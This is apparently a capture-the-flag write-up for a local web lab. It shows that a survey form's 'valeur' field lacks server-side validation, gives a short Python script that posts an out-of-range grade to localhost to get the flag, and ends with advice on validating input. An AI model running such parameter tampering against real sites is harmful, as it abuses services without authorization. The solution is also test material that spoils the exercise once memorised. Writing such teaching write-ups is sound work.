# How

In the survey page, there is a form in which we can submit our opinion on different subjects, by grading them from 1 to 10.

The form does a POST request to `#` (the same page), with the parameter `valeur` set to the grade we gave.

But, we can specify any value for `valeur`, being it a string, or a number `<1` or `>10`.

Passing a grade that is superior to 10 will give us the flag.

You can do that by editing the webpage's DOM via your browser's DevTools, or doing it using Python :

```py
import requests

params = {
    'page': 'survey',
}

data = {
    'sujet': '3',
    'valeur': '10000',
}

response = requests.post('http://localhost:4242/', params=params, data=data)
print(response.text)
```

# Fix

- Never trust a user's input
- Check form data on the server side too